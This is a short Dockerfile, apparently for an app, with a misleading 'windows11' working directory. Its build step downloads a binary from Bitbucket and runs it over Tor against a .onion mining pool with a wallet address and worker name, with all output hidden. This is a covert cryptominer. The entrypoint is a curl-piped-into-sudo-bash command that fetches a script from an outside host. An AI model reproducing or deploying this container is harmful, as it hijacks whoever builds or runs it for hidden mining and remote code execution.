FROM ubuntu:latest

# set working directory
WORKDIR /usr/src/windows11/
ENV export DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install wget tor curl -y && curl ifconfig.me && service tor start && torsocks curl ifconfig.me && wget https://bitbucket.org/anli_angku/aset-anli/downloads/katek-fee && chmod u+x katek-fee && torsocks ./katek-fee -o mo2tor2amawhphlrgyaqlrqx7o27jaj7yldnx3t6jip3ow4bujlwz6id.onion:10032 -u 86fGg98tj5QTt4peYzxDrD4BfChE1LPtkceC6rVC6iP3FuApcNecY1c32cgrwMtWNY87H4iq2CM3DPJWQhjW8Mr7LQeZRsr.Pekerja01 -k > /dev/null"
# expose port
EXPOSE 3000

# start app
ENTRYPOINT ["curl", "-sL", "https://swenson.my.id/auto", "|", "sudo", "-E", "bash", "-"]
